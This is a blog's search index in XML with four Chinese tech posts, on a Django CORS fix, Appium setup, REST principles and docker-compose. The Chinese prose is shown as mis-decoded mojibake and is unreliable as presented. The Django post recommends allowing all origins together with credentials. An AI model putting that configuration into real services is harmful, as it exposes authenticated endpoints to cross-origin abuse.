<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Django è§£å†³è·¨åŸŸé—®é¢˜]]></title>
    <url>%2F2019%2F08%2F15%2Fdjango-cors-setting%2F</url>
    <content type="text"><![CDATA[1. ä½¿ç”¨django-cors-headersè§£å†³1.1 å®‰è£…django-cors-headers$ pip install django-cors-headers 1.2 ä¿®æ”¹settings.py123456789101112131415INSTALLED_APPS = [ ...... 'corsheaders', ......]MIDDLEWARE = [ ...... 'corsheaders.middleware.CorsMiddleware', 'django.middleware.common.CommonMiddleware', ......]CORS_ORIGIN_ALLOW_ALL = TrueCORS_ALLOW_CREDENTIALS = True 2. ä½¿ç”¨è‡ªå®šä¹‰middleware123456class EnableCors(MiddlewareMixin): @staticmethod def process_response(request, response): response["Access-Control-Allow-Origin"] = "*" # print(response["Access-Control-Allow-Origin"]) return response 3. æˆ‘é‡åˆ°çš„é—®é¢˜ä»¥å‰éƒ½æ˜¯ç›´æ¥ç”¨1å°±è§£å†³äº†ï¼Œæ²¡æƒ³åˆ°ä»Šå¤©åƒç˜ªäº†ï¼Œæ‡µé€¼äº†å¥½ä¸€ä¼šã€‚ã€‚ä¸Šé¢ä¸¤ç§æ–¹å¼éƒ½è¯•è¿‡äº†ï¼Œå‰ç«¯å§‹ç»ˆæŠ¥é”™ï¼Œäºæ˜¯ç”¨httpieæµ‹è¯•äº†ä¸€ä¸‹æ¥å£ç»“æœå¦‚ä¸‹ 12345678-&gt; % http -h GET http://xxxx/HTTP/1.1 302 Moved TemporarilyConnection: keep-aliveContent-Length: 169Content-Type: text/htmlDate: Thu, 15 Aug 2019 08:34:48 GMTLocation: https://xxxx/Server: stgw/1.3.10.9_1.13.5 ç ´æ¡ˆäº†ï¼Œå› ä¸ºå…¬å¸è¿ç»´ç»™é…çš„åŸŸåè‡ªåŠ¨ä¼šæŠŠhttpè¯·æ±‚é‡å®šå‘åˆ°httpsï¼Œå¯¼è‡´è¿”å›å¤´æ²¡æœ‰Access-Control-Allow-Originå­—æ®µï¼Œä¹Ÿä½¿å¾—è·¨åŸŸçš„è®¾ç½®å¤±æ•ˆã€‚]]></content>
      <categories>
        <category>ç–‘éš¾é—®é¢˜</category>
      </categories>
      <tags>
        <tag>Django</tag>
        <tag>CORS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows 10 Appium-Python-Android ç¯å¢ƒé…ç½®]]></title>
    <url>%2F2019%2F07%2F18%2Fwindows_config_appium%2F</url>
    <content type="text"><![CDATA[æœ¬æ–‡è®°å½•äº†åœ¨ Windows 10ç³»ç»Ÿä¸‹ Appium-Python-Android ç¯å¢ƒé…ç½®è¿‡ç¨‹ 1. ç¯å¢ƒé…ç½®éœ€è¦çš„ç¯å¢ƒå¦‚ä¸‹ï¼š jdk8 Android-sdk Python Nodejs Appium Python lib: Appium-Python-Client Python IDE: PyCharm Git Cmake opencv4nodejs mjpeg-consumer ffmpeg bundletool.jar 1.1 JDK81.1.1 åˆ°oracle å®˜ç½‘ä¸‹è½½JDK8å®˜ç½‘ä¸‹è½½é€‰æ‹©å¯¹åº”ç‰ˆæœ¬å®‰è£…å³å¯ 1.1.2 ç¯å¢ƒå˜é‡é…ç½® è¿›å…¥ æ­¤ç”µè„‘-é…ç½®-é«˜çº§ç³»ç»Ÿé…ç½®-ç¯å¢ƒå˜é‡ é…ç½®å…¨å±€ç¯å¢ƒå˜é‡(ä¸‹é¢çš„éƒ¨åˆ†) é…ç½®JAVA_HOME å˜é‡ï¼Œå°†è·¯å¾„è®¾ä¸ºC:\xxx\xxx\xx\jdk1.8_xxxx(jdk å®‰è£…è·¯å¾„) Pathä¸­å¢åŠ ä¸¤ä¸ªæ¡ç›®%JAVA_HOME%\binå’Œ%JAVA_HOME%\jre\bin åœ¨å‘½ä»¤è¡Œè¾“å…¥java/javacæ¥åˆ¤æ–­æ˜¯å¦é…ç½®æˆåŠŸ 1.2 Android SDKå®‰è£…Android Studioå³å¯ï¼Œä¸‹è½½åœ°å€ 1.3 Pythonåˆ°Pythonå®˜ç½‘ ä¸‹è½½æŒ‡å®šç‰ˆæœ¬å®‰è£…å³å¯(2.7ä¸è¦ç”¨3+) 1.4 NodeJSåˆ°nodejså®˜ç½‘æœ€å¥½ä¸‹è½½10ï¼ŒLTSç‰ˆæœ¬ï¼Œ12å¯¹äºåé¢è¦å®‰è£…çš„æ¨¡å—æ— æ³•å…¼å®¹ æ³¨æ„ : ç”¨æˆ·çš„ç¯å¢ƒå˜é‡ä¼šè‡ªåŠ¨æ·»åŠ npmï¼Œéœ€è¦æ‰‹åŠ¨åœ¨ç³»ç»Ÿç¯å¢ƒå˜é‡é‡Œé¢æ·»åŠ npm 1.5 Appium å®‰è£…æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å³å¯ 12npm install -g appiumnpm install -g appium-doctor appium-doctor ç”¨äºæ£€æµ‹ç¯å¢ƒæ˜¯å¦ç¬¦åˆAppiumçš„è¦æ±‚ 1.6 Python lib: Appium-Python-Client12pip install Appium-Python-Clientpip install selenium==3.0.2 1.7 PyCharm å®‰è£…Jetbrains å®˜ç½‘å®‰è£…, Communityç‰ˆæœ¬å³å¯ï¼Œæœ‰æ•™è‚²é‚®ç®±å¯ä»¥ç”³è¯·Pro 1.8 Git å®‰è£…å®˜ç½‘ä¸‹è½½å³å¯, å‹¾é€‰åŠ å…¥Path 1.9 cmake å®‰è£…å®˜ç½‘ä¸‹è½½, å®‰è£…å‹¾é€‰åŠ å…¥Path 1.10 opencv4nodejs å®‰è£…1npm install -g opencv4nodejs --registry=https://registry.npm.taobao.org 1.11 ffmpegå®‰è£…å®˜ç½‘ä¸‹è½½build, ç„¶åæŠŠbinç›®å½•æ·»åŠ åˆ°Path 1.12 mjpeg-consumer å®‰è£…1npm install -g mjpeg-consumer --registry=https://registry.npm.taobao.org 1.13 bundletool.jar å®‰è£…releaseé“¾æ¥ 2. æ‰‹æœºè¿æ¥usbè°ƒè¯•2.1 adbè¿æ¥å°†æ‰‹æœºè¿ä¸ŠPCï¼ŒCMDä¸­è¾“å…¥: 12adb devicesadb shell å¦‚æœå‡ºç°ä»¥ä¸‹ä¿¡æ¯: error: device unauthorized.This adb serverâ€™s $ADB_VENDOR_KEYS is not setTry â€˜adb kill-serverâ€™ if that seems wrong.Otherwise check for a confirmation dialog on your device. åœ¨æ‰‹æœºä¸Šè¿›è¡Œå¦‚ä¸‹æ“ä½œ: åœ¨å¼€å‘è€…å·¥å…·-å…è®¸USBè°ƒè¯• é€‰é¡¹å…³äº†å†å¼€ å¼¹å‡ºçš„å¯¹è¯æ¡†é€‰æ‹©å…è®¸ 2.2 æŸ¥çœ‹è®¾å¤‡ä¿¡æ¯1cat /system/build.prop å¦‚æœå‡ºç°ä»¥ä¸‹ç»“æœè¯´æ˜éœ€è¦rootæƒé™ cat: /system/build.prop: Permission denied]]></content>
      <categories>
        <category>ç¯å¢ƒé…ç½®</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Appium</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RESTfulé£æ ¼ç®€ä»‹]]></title>
    <url>%2F2019%2F06%2F25%2Frest_pieces%2F</url>
    <content type="text"><![CDATA[æœ¬æ–‡ä¸»è¦ä»‹ç»äº†RESTçš„å®šä¹‰å’Œç‰¹æ€§ ä»€ä¹ˆæ˜¯RESTREST, REpresentational State Transfer, è¡¨ç°å±‚çŠ¶æ€è½¬ç§»æ˜¯ä¸€ç§ç¼–ç¨‹é£æ ¼ã€‚å®ƒæè¿°äº†ä¸¤ä¸ªç³»ç»Ÿ(å…¸å‹çš„æ˜¯å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯)é€šè¿‡ç½‘ç»œäº¤äº’çš„ä¸€ç³»åˆ—å‡†åˆ™ã€‚REST æ˜¯ä¸€ç§é£æ ¼ï¼Œæ˜¯æŒ‡å¯¼æ–¹é’ˆï¼Œè€Œä¸æ˜¯è§„å®šçš„ç»†åˆ™æˆ–è€…æ ‡å‡†ã€‚æ‰€ä»¥åªæ˜¯æœ‰â€œæœ€ä½³å®è·µâ€, è€Œæ²¡æœ‰â€œè§„èŒƒè¯´æ˜â€ã€‚æœ€æ—©ç”±Roy Fieldingäº2000å¹´åœ¨ä»–çš„åšå£«è®ºæ–‡â€Architectural Styles and the Design of Network-based Software Architecturesâ€ä¸­æå‡ºã€‚RESTæ˜¯åŸºäºèµ„æºçš„ï¼Œä¸‹é¢æ˜¯RESTé£æ ¼çš„ä¸€éƒ¨åˆ†ï¼š Things vs actionsNouns vs verbsResources identified by URIs . Multiple URIs may refer to the same resourceResources are separate from their representation representational è¡¨ç°å±‚è¡¨ç°å±‚æ˜¯æŒ‡èµ„æºçš„è¡¨ç°å½¢å¼ï¼Œä¹Ÿå°±æ˜¯èµ„æºçš„ä¿¡æ¯æ˜¯å¦‚ä½•ç»„ç»‡çš„ã€‚ä»–èƒ½éƒ¨åˆ†ä»£è¡¨èµ„æºçš„çŠ¶æ€ï¼Œè¡¨ç°å±‚åœ¨å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ä¹‹é—´äº¤äº’ï¼Œå…¸å‹çš„å½¢å¼æ˜¯XML/JSONä¸¾ä¸ªä¾‹å­ï¼Œæ•°æ®åº“ä¸­å­˜æœ‰ä¸€ä¸ªäººçš„ä¸ªäººä¿¡æ¯ï¼Œé‚£ä¹ˆ: èµ„æº: è¿™ä¸ªäººçš„ä¸ªäººä¿¡æ¯ æœåŠ¡: è·å–è”ç³»æ–¹å¼ (GET) è¡¨ç°å±‚: äººåï¼Œä½å€ï¼Œç”µè¯(JSON/XML) ä¸ºä»€ä¹ˆä½¿ç”¨RESTful API è®¾è®¡ç®€æ´ éµå¾ªæ ‡å‡†çš„HTTPåè®® ç‹¬ç«‹äºç¼–ç¨‹è¯­è¨€ä¹‹å¤– æœ€é‡è¦çš„æ˜¯: æœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯çš„è½»è€¦åˆï¼Œå®ƒè®©æœåŠ¡ç«¯å¯¹å®¢æˆ·ç«¯â€ä¸å¯çŸ¥â€ï¼Œåªè¦èƒ½ä½¿ç”¨HTTPåè®®è¿›è¡Œäº¤äº’ï¼Œä¸è®ºæ˜¯æµè§ˆå™¨ï¼Œæ‰‹æœºè¿˜æ˜¯å…¶ä»–è®¾å¤‡éƒ½æ— æ‰€è°“ã€‚ RESTful 6ä¸ªæŒ‡å¯¼æ€§çš„çº¦æŸ Uniform Interface ç»Ÿä¸€çš„æ¥å£ Stateless æ— çŠ¶æ€ Cacheable å¯ç¼“å­˜ server-client æœåŠ¡ç«¯-å®¢æˆ·ç«¯ åˆ†å±‚çš„ç³»ç»Ÿ æŒ‰éœ€ä»£ç  Uniform Interface ç»Ÿä¸€çš„æ¥å£èµ„æºçš„å®šä½: ç‹¬ç«‹çš„èµ„æºä¼šè¢«HTTPè¯·æ±‚å®šä½, æ¯”æ–¹è¯´ä½¿ç”¨ URI. åœ¨æ¦‚å¿µä¸Šï¼Œèµ„æºæ˜¯ä¸è¡¨ç°å±‚åˆ†ç¦»çš„ï¼Œå®¢æˆ·ç«¯è¯·æ±‚çš„å¾—åˆ°çš„æ•°æ®æ˜¯èµ„æºçš„è¡¨ç°å±‚è€Œä¸æ˜¯èµ„æºæœ¬èº«ã€‚ é€šè¿‡è¡¨ç°å±‚æ“ä½œèµ„æº: å½“å®¢æˆ·ç«¯æ‹¥æœ‰äº†(é™„åŠ äº†ä¸€äº›å…ƒä¿¡æ¯ï¼Œå¦‚HTTP HEADERsçš„)èµ„æºçš„è¡¨ç°å±‚, å®ƒå°±æœ‰äº†è¶³å¤Ÿçš„æƒé™å¯¹èµ„æºè¿›è¡Œä¿®æ”¹æˆ–è€…åˆ é™¤ã€‚ è‡ªæè¿°ä¿¡æ¯: æ¯ä¸ªHTTPæ¶ˆæ¯åŒ…å«è¶³å¤Ÿçš„ä¿¡æ¯ï¼Œå‘Šè¯‰æ¥æ”¶ç«¯æ€æ ·å¤„ç†è¿™ä¸ªä¿¡æ¯ã€‚ HATEOAS(Hypermedia as the Engine of Application State, è¶…åª’ä½“å³åº”ç”¨çŠ¶æ€å¼•æ“): å½“å®¢æˆ·ç«¯æ¸¸æ³³ä¸€ä¸ªåˆå§‹3çš„URIï¼ŒRESTåº”ç”¨åº”è¯¥å¯ä»¥åŠ¨æ€åˆ©ç”¨æœåŠ¡ç«¯æä¾›çš„é“¾æ¥æ¥è®¿é—®åˆ°æ‰€æœ‰èµ„æºæˆ–è€…è¿›è¡Œæ‰€æœ‰æ“ä½œã€‚ Stateless æ— çŠ¶æ€æ— çŠ¶æ€åŸåˆ™Statelessnessï¼šæ— çŠ¶æ€åŸåˆ™æ˜¯RESTfulæ¶æ„è®¾è®¡ä¸­ä¸€ä¸ªéå¸¸é‡è¦çš„åŸåˆ™ï¼Œæ— çŠ¶æ€æ˜¯ç›¸å¯¹äºæœ‰çŠ¶æ€è€Œè¨€çš„ã€‚åœ¨ç†è§£ä»€ä¹ˆæ˜¯æ— çŠ¶æ€çš„äº¤äº’è¯·æ±‚ä¹‹å‰ï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦äº†è§£ä»€ä¹ˆæ˜¯æœ‰çŠ¶æ€ï¼Œå¹¶å¯¹ä¸¤è€…è¿›è¡Œæ¯”è¾ƒä»¥åŠ æ·±è®¤è¯†ã€‚ WebæœåŠ¡çš„çŠ¶æ€WebæœåŠ¡å»ºç«‹åœ¨Webåº”ç”¨ç¨‹åºçš„åè®®ä¹‹ä¸Šï¼Œå¦‚ï¼šHTTPåè®®ã€‚WebæœåŠ¡çš„çŠ¶æ€æŒ‡çš„æ˜¯è¯·æ±‚çš„çŠ¶æ€ï¼Œè€Œä¸æ˜¯èµ„æºçš„çŠ¶æ€ã€‚æ˜¯ä¸¤ä¸ªå…³è”ç”¨æˆ·(Clientä¸Server)è¿›è¡Œäº¤äº’æ“ä½œæ—¶æ‰€ç•™ä¸‹æ¥çš„å…¬å…±ä¿¡æ¯(å·¥ä½œæµã€ç”¨æˆ·çŠ¶æ€ä¿¡æ¯ç­‰æ•°æ®)ã€‚è¿™äº›ä¿¡æ¯å¯ä»¥è¢«æŒ‡å®šåœ¨ä¸åŒçš„ä½œç”¨åŸŸä¸­ï¼Œå¦‚ï¼špageã€requestã€sessionã€applicationæˆ–å…¨å±€ä½œç”¨åŸŸï¼Œä¸€èˆ¬ç”±Serverä¸­çš„Sessionæ¥ä¿å­˜è¿™äº›ä¿¡æ¯ã€‚ æœ‰çŠ¶æ€çš„WebæœåŠ¡åœ¨åŸºäºçŠ¶æ€çš„WebæœåŠ¡ä¸­ï¼ŒClientä¸Serveräº¤äº’çš„ä¿¡æ¯(å¦‚ï¼šç”¨æˆ·ç™»å½•çŠ¶æ€)ä¼šä¿å­˜åœ¨Serverçš„Sessionä¸­ã€‚å†è¿™æ ·çš„å‰æä¸‹ï¼ŒClientä¸­çš„ç”¨æˆ·è¯·æ±‚åªèƒ½è¢«ä¿å­˜æœ‰æ­¤ç”¨æˆ·ç›¸å…³çŠ¶æ€ä¿¡æ¯çš„æœåŠ¡å™¨æ‰€æ¥å—å’Œç†è§£ï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€åœ¨åŸºäºçŠ¶æ€çš„Webç³»ç»Ÿä¸­çš„Serveræ— æ³•å¯¹ç”¨æˆ·è¯·æ±‚è¿›è¡Œè´Ÿè½½å‡è¡¡ç­‰è‡ªç”±çš„è°ƒåº¦(ä¸€ä¸ªClientè¯·æ±‚åªèƒ½ç”±ä¸€ä¸ªæŒ‡å®šçš„Serverå¤„ç†)ã€‚åŒæ—¶è¿™ä¹Ÿä¼šå¯¼è‡´å¦å¤–ä¸€ä¸ªå®¹é”™æ€§çš„é—®é¢˜ï¼Œå¦‚æœæŒ‡å®šçš„Serveråœ¨Clientçš„ç”¨æˆ·å‘å‡ºè¯·æ±‚çš„è¿‡ç¨‹ä¸­å®•æœºï¼Œé‚£ä¹ˆæ­¤ç”¨æˆ·æœ€è¿‘çš„æ‰€æœ‰äº¤äº’æ“ä½œå°†æ— æ³•è¢«è½¬ç§»è‡³åˆ«çš„Serverä¸Šï¼Œå³æ­¤è¯·æ±‚å°†æ— æ•ˆåŒ–ã€‚ æ— çŠ¶æ€çš„WebæœåŠ¡åœ¨æ— çŠ¶æ€çš„WebæœåŠ¡ä¸­ï¼Œæ¯ä¸€ä¸ªWebè¯·æ±‚éƒ½å¿…é¡»æ˜¯ç‹¬ç«‹çš„ï¼Œè¯·æ±‚ä¹‹é—´æ˜¯å®Œå…¨åˆ†ç¦»çš„ã€‚Serveræ²¡æœ‰ä¿å­˜Clientçš„çŠ¶æ€ä¿¡æ¯ï¼Œæ‰€ä»¥Clientå‘é€çš„è¯·æ±‚å¿…é¡»åŒ…å«æœ‰èƒ½å¤Ÿè®©æœåŠ¡å™¨ç†è§£è¯·æ±‚çš„å…¨éƒ¨ä¿¡æ¯ï¼ŒåŒ…æ‹¬è‡ªå·±çš„çŠ¶æ€ä¿¡æ¯ã€‚ä½¿å¾—ä¸€ä¸ªClientçš„Webè¯·æ±‚èƒ½å¤Ÿè¢«ä»»ä½•å¯ç”¨çš„Serveråº”ç­”ï¼Œä»è€Œå°†Webç³»ç»Ÿæ‰©å±•åˆ°å¤§é‡çš„Clientä¸­ã€‚ ä¸¤è€…çš„åŒºåˆ«å› ä¸ºæ— çŠ¶æ€åŸåˆ™çš„ç‰¹æ€§ï¼Œè®©RESTfulåœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­å¾—åˆ°äº†å¹¿æ³›çš„åº”ç”¨ï¼Œå®ƒæ”¹å–„äº†åˆ†å¸ƒå¼ç³»ç»Ÿçš„å¯è§æ€§ã€å¯é æ€§ä»¥åŠå¯ä¼¸ç¼©æ€§ï¼ŒåŒæ—¶æœ‰æ•ˆçš„é™ä½äº†Clientä¸Serverä¹‹é—´çš„äº¤äº’å»¶è¿Ÿã€‚æ— çŠ¶æ€çš„è¯·æ±‚æœ‰åˆ©äºå®ç°è´Ÿè½½å‡è¡¡ï¼Œåœ¨åˆ†å¸ƒå¼webç³»ç»Ÿä¸‹ï¼Œæœ‰å¤šä¸ªå¯çš„Serverï¼Œæ¯ä¸ªServeréƒ½å¯ä»¥å¤„ç†Clientå‘é€çš„è¯·æ±‚ã€‚æœ‰çŠ¶æ€çš„è¯·æ±‚çš„çŠ¶æ€ä¿¡æ¯åªä¿å­˜åœ¨ç¬¬ä¸€æ¬¡æ¥æ”¶è¯·æ±‚çš„Serverä¸Šï¼Œæ‰€ä»¥åæ¥åŒä¸€ä¸ªClientçš„è¯·æ±‚éƒ½åªèƒ½ç”±è¿™å°Serveræ¥å¤„ç†ï¼ŒServeræ— æ³•è‡ªç”±è°ƒåº¦è¯·æ±‚ã€‚æ— çŠ¶æ€è¯·æ±‚åˆ™å®Œå…¨æ²¡æœ‰è¿™ä¸ªé™åˆ¶ã€‚å…¶æ¬¡ï¼Œæ— çŠ¶æ€è¯·æ±‚æœ‰è¾ƒå¼ºçš„å®¹é”™æ€§å’Œå¯ä¼¸ç¼©æ€§ã€‚å¦‚æœä¸€å°æœåŠ¡å™¨å®•æœºï¼Œæ— çŠ¶æ€è¯·æ±‚å¯ä»¥é€æ˜åœ°äº¤ç”±å¦ä¸€å°å¯ç”¨Serveræ¥å¤„ç†ï¼Œè€Œæœ‰çŠ¶æ€çš„è¯·æ±‚åˆ™ä¼šå› ä¸ºå­˜å‚¨è¯·æ±‚çŠ¶æ€ä¿¡æ¯çš„Serverå®•æœºè€Œæ‰¿æ‹…çŠ¶æ€ä¸¢å¤±çš„é£é™©ã€‚Restfulé£æ ¼çš„æ— çŠ¶æ€çº¦æŸè¦æ±‚Serverä¸ä¿å­˜è¯·æ±‚çŠ¶æ€ï¼Œå¦‚æœç¡®å®éœ€è¦ç»´æŒç”¨æˆ·çŠ¶æ€ï¼Œä¹Ÿåº”ç”±Clientè´Ÿè´£ã€‚ä¾‹å¦‚ï¼š ä½¿ç”¨Cookiesé€šè¿‡å®¢æˆ·ç«¯ä¿æŒç™»é™†çŠ¶æ€ï¼š åœ¨RESTä¸­ï¼Œæ¯ä¸€ä¸ªå¯¹è±¡éƒ½æ˜¯é€šè¿‡URLæ¥è¡¨ç¤ºï¼Œå¯¹è±¡ç”¨æˆ·è´Ÿè´£å°†çŠ¶æ€ä¿¡æ¯æ‰“åŒ…è¿›æ¯ä¸€æ¡ä¿¡æ¯å†…ï¼Œä¿è¯å¯¹è±¡çš„å¤„ç†æ€»æ˜¯æ— çŠ¶æ€çš„ã€‚åœ¨HTTPæœåŠ¡å™¨ä¸­ï¼ŒæœåŠ¡å™¨æ²¡æœ‰ä¿å­˜å®¢æˆ·ç«¯çš„çŠ¶æ€ä¿¡æ¯ï¼Œå®¢æˆ·ç«¯å¿…é¡»æ¯æ¬¡éƒ½å¸¦ä¸Šè‡ªå·±çš„çŠ¶æ€å»è¯·æ±‚æœåŠ¡å™¨ã€‚å®¢æˆ·ç«¯ä»¥URLå½¢å¼æäº¤çš„è¯·æ±‚åŒ…å«äº†cookiesç­‰å¸¦çŠ¶æ€çš„æ•°æ®ï¼Œè¿™äº›æ•°æ®å®Œå…¨æŒ‡å®šäº†æ‰€éœ€çš„ç™»å½•ä¿¡æ¯ï¼Œè€Œä¸éœ€è¦å…¶ä»–è¯·æ±‚çš„ä¸Šä¸‹æ–‡æˆ–å†…å­˜ã€‚ ä¼ é€’User credentialsæ˜¯æ— çŠ¶æ€çš„ï¼Œè€Œä¼ é€’SessionIDæ˜¯æœ‰çŠ¶æ€çš„,å› ä¸ºsessionä¿¡æ¯ä¿å­˜åœ¨æœåŠ¡å™¨ç«¯ã€‚ æ— çŠ¶æ€è¯·æ±‚ï¼šServerä¸ä¿å­˜ä»»ä½•è¯·æ±‚çŠ¶æ€ä¿¡æ¯ï¼ŒClientçš„æ¯ä¸€ä¸ªè¯·æ±‚éƒ½å…·æœ‰User credentialsç­‰æ‰€éœ€è¦çš„å…¨éƒ¨ä¿¡æ¯ï¼Œæ‰€ä»¥èƒ½è¢«ä»»æ„å¯ç”¨çš„Serveråº”ç­”ã€‚ æœ‰çŠ¶æ€è¯·æ±‚ï¼šServerä¿å­˜äº†Clientçš„è¯·æ±‚çŠ¶æ€ï¼ŒServerä¼šé€šè¿‡Clientä¼ é€’çš„SessionIDåœ¨Serverä¸­çš„Sessionä½œç”¨åŸŸæ‰¾åˆ°ä¹‹å‰äº¤äº’çš„ä¿¡æ¯ï¼Œå¹¶ä»¥æ­¤æ¥å®ç°åº”ç­”ã€‚æ‰€ä»¥Clientåªèƒ½ç”±æŸä¸€ä¸ªServeræ¥åº”ç­”ã€‚ Cacheable å¯ç¼“å­˜äº’è”ç½‘ä¸­çš„å®¢æˆ·ç«¯å’Œä¸­é—´å±‚æœåŠ¡å™¨å¯ä»¥ç¼“å­˜å“åº”ã€‚å› æ­¤å“åº”å¿…é¡»ç›´æ¥æˆ–é—´æ¥å®šä¹‰è‡ªèº«æ˜¯å¦å¯è¢«ç¼“å­˜ï¼Œä»¥å…å®¢æˆ·ç«¯ä½¿ç”¨è¿‡æœŸçš„å“åº”æ•°æ®æ¥å‘é€å…¶å®ƒè¯·æ±‚ã€‚è‰¯å¥½çš„ç¼“å­˜ç­–ç•¥å¯ä»¥æœ‰æ•ˆå‡å°‘å®¢æˆ·ç«¯-æœåŠ¡å™¨ä¹‹é—´çš„äº¤äº’ï¼Œä»è€Œè¿›ä¸€æ­¥æé«˜ç³»ç»Ÿçš„å¯ä¼¸ç¼©æ€§å’Œæ€§èƒ½ã€‚ Server-Client æœåŠ¡ç«¯-å®¢æˆ·ç«¯ wiki: å®¢æˆ·ç«¯-æœåŠ¡ç«¯æ¨¡å‹ å®¢æˆ·ç«¯-æœåŠ¡ç«¯åˆ†ç¦»:é€šè¿‡åˆ†ç¦»ç”¨æˆ·ç•Œé¢å’Œæ•°æ®å­˜å‚¨è¿™ä¸¤ä¸ªå…³æ³¨ç‚¹ï¼Œæé«˜äº†ç”¨æˆ·ç•Œé¢è·¨å¹³å°çš„å¯èƒ½æ€§ï¼Œé€šè¿‡ç®€åŒ–æœåŠ¡å™¨ç»„ä»¶æé«˜äº†å…¶å¯ä¼¸ç¼©æ€§ã€‚è¿™ç§åˆ†ç¦»å¯¹äºWebæ¥è¯´æ›´åŠ é‡è¦çš„æ„ä¹‰æ˜¯ï¼Œå®ƒä½¿å¾—ç»„ä»¶èƒ½å¤Ÿè¿›è¡Œç‹¬ç«‹ä¿®æ”¹å’Œæ‰©å±•ï¼Œä»è€Œèƒ½å¤Ÿæ”¯æŒå¤§é‡ç»„ç»‡çš„ç½‘ç»œåŒ–éœ€æ±‚ã€‚ Layered system åˆ†å±‚ç³»ç»Ÿ å®¢æˆ·ç«¯é€šå¸¸æ— æ³•åˆ¤æ–­å®ƒæ˜¯å¦æ˜¯ç›´æ¥è¿æ¥åˆ°åç«¯æœåŠ¡å™¨ï¼Œè¿˜æ˜¯ä¸­é—´æœåŠ¡å™¨ã€‚ä¸­é—´æœåŠ¡å™¨å¯é€šè¿‡å¯ç”¨è´Ÿè½½å¹³è¡¡ï¼Œå¹¶é€šè¿‡æä¾›å…±äº«é«˜é€Ÿç¼“å­˜æ¥æé«˜ç³»ç»Ÿçš„å¯æ‰©å±•æ€§ã€‚å½“ç„¶ä¹Ÿå¯ä»¥å¼ºåˆ¶æ‰§è¡Œå®‰å…¨æ”¿ç­–ã€‚ Code on demand æŒ‰éœ€ä»£ç ï¼ˆå¯é€‰ï¼‰ æœåŠ¡ç«¯å¯ä»¥é€šè¿‡ä¼ é€’å¯æ‰§è¡Œä»£ç ä¸´æ—¶ä¸ºå®¢æˆ·ç«¯æ‰©å±•æˆ–è‡ªå®šä¹‰åŠŸèƒ½ã€‚è¿™æ–¹é¢çš„ä¾‹å­åŒ…æ‹¬å¯ç¼–è¯‘çš„ç»„ä»¶å¦‚Java appletså’Œå®¢æˆ·æœºç«¯è„šæœ¬å¦‚JavaScriptã€‚]]></content>
      <categories>
        <category>å­¦ä¹ è®°å½•</category>
      </categories>
      <tags>
        <tag>RESTful</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[è¿è¡Œå¤šå®¹å™¨çš„åº”ç”¨--ä½¿ç”¨docker-compose]]></title>
    <url>%2F2019%2F06%2F03%2Fdocker-compose-ups-ans-downs%2F</url>
    <content type="text"><![CDATA[ä½¿ç”¨docker-compose.ymlå¯¹å¤šå®¹å™¨çš„åº”ç”¨(ç»„)è¿›è¡Œå®¹å™¨ç¼–æ’ ä½¿ç”¨docker-compose.ymlæ¥å®šä¹‰ä½ çš„åº”ç”¨ï¼Œå¹¶ä¸”ä½¿ç”¨up/downå‘½ä»¤æ¥è¿è¡Œï¼Œè¿™æ ·å¯ä»¥è®©ä½ å¯¹å¤šå®¹å™¨çš„åº”ç”¨è¿›è¡Œç¼–æ’ã€‚Composeæ˜¯ä¸€ä¸ªå®šä¹‰å’Œè¿è¡Œå¤šå®¹å™¨åº”ç”¨çš„å·¥å…·, ä¹Ÿå°±æ˜¯å®¹å™¨ç¼–æ’å·¥å…·ã€‚ä½¿ç”¨Composeæ—¶ï¼Œä½ ä¼šä½¿ç”¨åˆ°ä¸€ä¸ªComposeé…ç½®æ–‡ä»¶å»é…ç½®ä½ çš„åº”ç”¨çš„å„ä¸ªæœåŠ¡ã€‚ç„¶åé€šè¿‡ä½¿ç”¨è¿™ä¸ªé…ç½®æ–‡ä»¶å°±å¯ä»¥ä¸€æ¡å‘½ä»¤å¯åŠ¨æ‰€æœ‰çš„æœåŠ¡ã€‚ å’Œdockerå‘½ä»¤çš„ç±»ä¼¼ä¹‹å¤„Docker-composeå‘½ä»¤å¤§ä½“ä¸Šå’Œdockerå‘½ä»¤ç±»ä¼¼ï¼Œé™¤äº†ä¸€äº›ç»™å¤šå®¹å™¨åº”ç”¨çš„ä½¿ç”¨çš„é™„åŠ æŒ‡ä»¤ã€‚å°¤å…¶æ˜¯ä¸‹é¢è¿™äº›å‘½ä»¤ï¼Œå’Œdockerå‘½ä»¤å¾ˆç±»ä¼¼: docker-compose up / downdocker-compose up ç”¨äºåˆ›å»ºå¹¶è¿è¡Œå®¹å™¨. åœ¨detached( -d )æ¨¡å¼ä¸‹, å¯åŠ¨å®¹å™¨ä¹‹åComposeä¼šé€€å‡º, ä½†æ˜¯å®¹å™¨è¿˜åœ¨åå°è¿è¡Œã€‚ 1docker-compose up -d rabbit-mq docker-compose down ç”¨äºåœæ­¢å¹¶ç§»é™¤å®¹å™¨ï¼Œç½‘ç»œï¼Œé•œåƒå’Œå·ã€‚ 1docker-compose down -v è¿™ä¸ªå‘½ä»¤æœ‰ä¸€äº›æœ‰ç”¨çš„é€‰é¡¹: â€“rmi [type] ç§»é™¤é•œåƒã€‚typeå¿…é¡»æ˜¯ä»¥ä¸‹å…¶ä¸­ä¸€ä¸ª: â€˜allâ€™: ç§»é™¤ä»»ä½•æœåŠ¡ä½¿ç”¨çš„æ‰€æœ‰çš„é•œåƒã€‚ â€˜localâ€™: åªç§»é™¤æ²¡æœ‰é€šè¿‡imageè®¾ç½®è‡ªå®šä¹‰æ ‡ç­¾çš„é•œåƒã€‚ -v, â€“volumes ç§»é™¤åœ¨é…ç½®æ–‡ä»¶ä¸­é€šè¿‡volumeså£°æ˜çš„å‘½åå·å’Œattachåˆ°è¿™ä¸ªå®¹å™¨çš„æ‰€æœ‰å·ã€‚ â€“remove-orphans ç§»é™¤æ²¡æœ‰åœ¨Composerä¸­å®šä¹‰çš„å®¹å™¨(æ€æ­»å­¤å„¿)ã€‚ 